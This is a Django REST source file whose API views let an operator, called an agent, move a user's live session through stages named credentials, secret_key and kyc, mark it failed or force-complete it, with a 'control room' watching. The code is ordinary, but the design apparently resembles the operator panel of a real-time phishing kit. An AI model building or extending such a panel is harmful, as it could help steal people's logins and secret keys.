# accounts/api/views/control_views.py
"""
Session Navigation/Control API Views

Handles agent control actions on sessions:
- Navigate session to different stages with configurable data clearing
- Supports forward progression, backward navigation, and reset operations
"""

import logging
from django.utils import timezone
from rest_framework.views import APIView
from rest_framework.response import Response
from rest_framework.permissions import IsAuthenticated
from rest_framework import status
from asgiref.sync import async_to_sync
from channels.layers import get_channel_layer
from django.shortcuts import get_object_or_404

from accounts.models import Session, SessionLog
from ..serializers import NavigateSessionSerializer

logger = logging.getLogger(__name__)

# ==========================
# STAGE TRANSITION RULES
# ==========================
# RELAXED RULES: Agents can navigate to ANY stage from ANY stage
# This provides full flexibility for edge cases, skipping stages, etc.
VALID_STAGE_TRANSITIONS = {
    'case_id': ['case_id', 'credentials', 'secret_key', 'kyc', 'completed'],
    'credentials': ['case_id', 'credentials', 'secret_key', 'kyc', 'completed'],
    'secret_key': ['case_id', 'credentials', 'secret_key', 'kyc', 'completed'],
    'kyc': ['case_id', 'credentials', 'secret_key', 'kyc', 'completed'],
    'completed': [],  # Terminal - no transitions allowed from completed
}

# Data clearing behavior for each transition
DATA_CLEAR_MODES = {
    'submission': 'Clear only current_submission',
    'all': 'Clear all user_data (verified_data + current_submission)',
    'none': 'Keep all data intact',
}


class NavigateSessionView(APIView):
    """
    Unified endpoint for navigating sessions to different stages.

    POST /api/sessions/{uuid}/navigate/

    Body:
    {
        "target_stage": "case_id|credentials|secret_key|kyc|completed",
        "clear_data": "submission|all|none" (optional, default: "submission"),
        "reason": "optional reason for audit trail"
    }

    Returns:
    - Current stage, target stage, and operation result
    - WebSocket notification sent to user and control room

    Permissions:
    - Agents can only navigate sessions they own
    - Staff can navigate any session
    """

    permission_classes = [IsAuthenticated]

    def post(self, request, uuid):
        session = get_object_or_404(Session, uuid=uuid)

        # ============================
        # PERMISSION CHECK
        # ============================
        if not request.user.is_staff and session.agent != request.user:
            return Response(
                {'error': 'You are not authorized to manage this session'},
                status=status.HTTP_403_FORBIDDEN
            )

        # ============================
        # VALIDATE REQUEST
        # ============================
        serializer = NavigateSessionSerializer(data=request.data)
        serializer.is_valid(raise_exception=True)

        target_stage = serializer.validated_data['target_stage']
        clear_data = serializer.validated_data.get('clear_data', 'submission')
        reason = serializer.validated_data.get('reason', '')

        # ============================
        # CHECK SESSION STATUS
        # ============================
        if session.status == 'completed':
            return Response(
                {
                    'error': 'Cannot modify a completed session',
                    'current_stage': session.stage,
                    'current_status': session.status
                },
                status=status.HTTP_400_BAD_REQUEST
            )

        if session.status != 'active':
            return Response(
                {
                    'error': f"Session is {session.status}, not active",
                    'current_stage': session.stage,
                    'current_status': session.status
                },
                status=status.HTTP_400_BAD_REQUEST
            )

        # ============================
        # VALIDATE STAGE TRANSITION
        # ============================
        current_stage = session.stage
        valid_targets = VALID_STAGE_TRANSITIONS.get(current_stage, [])

        if target_stage not in valid_targets:
            return Response(
                {
                    'error': f"Cannot navigate from '{current_stage}' to '{target_stage}'",
                    'current_stage': current_stage,
                    'valid_targets': valid_targets
                },
                status=status.HTTP_400_BAD_REQUEST
            )

        # ============================
        # PERFORM NAVIGATION
        # ============================
        session.stage = target_stage

        # Handle status update for terminal stages
        if target_stage == 'completed':
            session.status = 'completed'

        # Clear data based on mode
        user_data = session.user_data or {}
        if clear_data == 'all':
            user_data = {}
        elif clear_data == 'submission':
            user_data['current_submission'] = {}

        session.user_data = user_data
        session._broadcasted_by_viewset = True
        session.save()

        # ============================
        # LOG ACTION
        # ============================
        log_message = f"Session navigated from '{current_stage}' to '{target_stage}'"
        if reason:
            log_message += f": {reason}"

        SessionLog.objects.create(
            session=session,
            message=log_message,
            log_type='agent_action',
            extra_data={
                'navigated_by': request.user.username,
                'from_stage': current_stage,
                'to_stage': target_stage,
                'clear_data_mode': clear_data,
                'reason': reason
            }
        )

        # ============================
        # NOTIFY USER
        # ============================
        try:
            async_to_sync(get_channel_layer().group_send)(
                f'session_{session.uuid}',
                {
                    'type': 'user_command',
                    'command': 'navigate',
                    'from_stage': current_stage,
                    'stage': target_stage,
                    'message': f'You have been moved to {target_stage} stage.',
                    'reason': reason
                }
            )
        except Exception as e:
            logger.warning(f"Failed to notify user {session.uuid}: {str(e)}")

        # ============================
        # NOTIFY CONTROL ROOM
        # ============================
        try:
            async_to_sync(get_channel_layer().group_send)(
                'control_room',
                {
                    'type': 'control_message',
                    'message': f'Session {session.external_case_id} navigated to {target_stage}'
                }
            )
        except Exception as e:
            logger.warning(f"Failed to notify control room: {str(e)}")

        # ============================
        # RETURN RESPONSE
        # ============================
        return Response(
            {
                'status': 'session_navigated',
                'message': f'Session navigated from {current_stage} to {target_stage}',
                'from_stage': current_stage,
                'to_stage': target_stage,
                'session_status': session.status,
                'clear_data_mode': clear_data
            },
            status=status.HTTP_200_OK
        )


class MarkUnsuccessfulView(APIView):
    """
    Mark verification as unsuccessful/failed and close session.

    POST /api/sessions/{uuid}/mark-unsuccessful/

    Body:
    {
        "reason": "optional reason for failure",
        "comment": "optional additional context"
    }

    Sets session.status = 'failed' and session.stage = 'completed'.
    Creates audit trail with failure details.

    Permissions:
    - Agents can only mark their own sessions as unsuccessful
    - Staff can mark any session as unsuccessful
    """

    permission_classes = [IsAuthenticated]

    def post(self, request, uuid):
        from ..serializers import MarkUnsuccessfulSerializer

        session = get_object_or_404(Session, uuid=uuid)

        # ============================
        # PERMISSION CHECK
        # ============================
        if not request.user.is_staff and session.agent != request.user:
            return Response(
                {'error': 'You are not authorized to manage this session'},
                status=status.HTTP_403_FORBIDDEN
            )

        # ============================
        # VALIDATE REQUEST
        # ============================
        serializer = MarkUnsuccessfulSerializer(data=request.data)
        serializer.is_valid(raise_exception=True)

        reason = serializer.validated_data.get('reason', '')
        comment = serializer.validated_data.get('comment', '')

        # ============================
        # CHECK SESSION STATUS
        # ============================
        if session.status != 'active':
            return Response(
                {
                    'error': f"Can only mark 'active' sessions as unsuccessful. Session is {session.status}",
                    'current_status': session.status
                },
                status=status.HTTP_400_BAD_REQUEST
            )

        # ============================
        # MARK AS UNSUCCESSFUL
        # ============================
        current_stage = session.stage
        session.stage = 'completed'
        session.status = 'failed'

        # Update user data with failure record
        user_data = session.user_data or {}
        user_data['verification_result'] = {
            'status': 'unsuccessful',
            'reason': reason,
            'comment': comment,
            'marked_by': request.user.username,
            'marked_at': timezone.now().isoformat(),
            'stage_when_failed': current_stage
        }
        session.user_data = user_data
        session._broadcasted_by_viewset = True
        session.save()

        # ============================
        # LOG ACTION
        # ============================
        log_message = f"Session marked as unsuccessful (failed verification)"
        if reason:
            log_message += f": {reason}"

        SessionLog.objects.create(
            session=session,
            message=log_message,
            log_type='agent_action',
            extra_data={
                'marked_by': request.user.username,
                'from_stage': current_stage,
                'reason': reason,
                'comment': comment
            }
        )

        # ============================
        # NOTIFY USER
        # ============================
        try:
            async_to_sync(get_channel_layer().group_send)(
                f'session_{session.uuid}',
                {
                    'type': 'user_command',
                    'command': 'verification_failed',
                    'message': 'Your verification was unsuccessful. Please contact support.',
                    'reason': reason
                }
            )
        except Exception as e:
            logger.warning(f"Failed to notify user {session.uuid}: {str(e)}")

        # ============================
        # NOTIFY CONTROL ROOM
        # ============================
        try:
            async_to_sync(get_channel_layer().group_send)(
                'control_room',
                {
                    'type': 'control_message',
                    'message': f'Session {session.external_case_id} marked as unsuccessful'
                }
            )
        except Exception as e:
            logger.warning(f"Failed to notify control room: {str(e)}")

        # ============================
        # RETURN RESPONSE
        # ============================
        return Response(
            {
                'status': 'marked_unsuccessful',
                'message': 'Session marked as unsuccessful',
                'session_status': session.status,
                'from_stage': current_stage,
                'reason': reason
            },
            status=status.HTTP_200_OK
        )


class ForceCompleteView(APIView):
    """
    Force complete a session from ANY stage.

    POST /api/sessions/{uuid}/force-complete/

    Body:
    {
        "reason": "optional reason for force completion",
        "comment": "optional additional context"
    }

    Sets session.status = 'completed' and session.stage = 'completed'.
    Can be called from ANY stage without validation.

    Permissions:
    - Agents can only force-complete their own sessions
    - Staff can force-complete any session
    """

    permission_classes = [IsAuthenticated]

    def post(self, request, uuid):
        from ..serializers import ForceCompleteSerializer

        session = get_object_or_404(Session, uuid=uuid)

        # ============================
        # PERMISSION CHECK
        # ============================
        if not request.user.is_staff and session.agent != request.user:
            return Response(
                {'error': 'You are not authorized to manage this session'},
                status=status.HTTP_403_FORBIDDEN
            )

        # ============================
        # VALIDATE REQUEST
        # ============================
        serializer = ForceCompleteSerializer(data=request.data)
        serializer.is_valid(raise_exception=True)

        reason = serializer.validated_data.get('reason', '')
        comment = serializer.validated_data.get('comment', '')

        # ============================
        # CHECK SESSION STATUS
        # ============================
        if session.status != 'active':
            return Response(
                {
                    'error': f"Can only force-complete 'active' sessions. Session is {session.status}",
                    'current_status': session.status
                },
                status=status.HTTP_400_BAD_REQUEST
            )

        # ============================
        # FORCE COMPLETE
        # ============================
        current_stage = session.stage
        session.stage = 'completed'
        session.status = 'completed'

        # Update user data with force completion record
        user_data = session.user_data or {}
        user_data['completion_record'] = {
            'type': 'force_completed',
            'reason': reason,
            'comment': comment,
            'completed_by': request.user.username,
            'completed_at': timezone.now().isoformat(),
            'stage_when_completed': current_stage
        }
        session.user_data = user_data
        session._broadcasted_by_viewset = True
        session.save()

        # ============================
        # LOG ACTION
        # ============================
        log_message = f"Session force-completed from {current_stage}"
        if reason:
            log_message += f": {reason}"

        SessionLog.objects.create(
            session=session,
            message=log_message,
            log_type='agent_action',
            extra_data={
                'completed_by': request.user.username,
                'from_stage': current_stage,
                'reason': reason,
                'comment': comment
            }
        )

        # ============================
        # NOTIFY USER
        # ============================
        try:
            async_to_sync(get_channel_layer().group_send)(
                f'session_{session.uuid}',
                {
                    'type': 'user_command',
                    'command': 'verification_completed',
                    'message': 'Your verification has been completed.',
                    'reason': reason
                }
            )
        except Exception as e:
            logger.warning(f"Failed to notify user {session.uuid}: {str(e)}")

        # ============================
        # NOTIFY CONTROL ROOM
        # ============================
        try:
            async_to_sync(get_channel_layer().group_send)(
                'control_room',
                {
                    'type': 'control_message',
                    'message': f'Session {session.external_case_id} force-completed'
                }
            )
        except Exception as e:
            logger.warning(f"Failed to notify control room: {str(e)}")

        # ============================
        # RETURN RESPONSE
        # ============================
        return Response(
            {
                'status': 'force_completed',
                'message': f'Session force-completed from {current_stage}',
                'session_status': session.status,
                'from_stage': current_stage,
                'reason': reason
            },
            status=status.HTTP_200_OK
        )
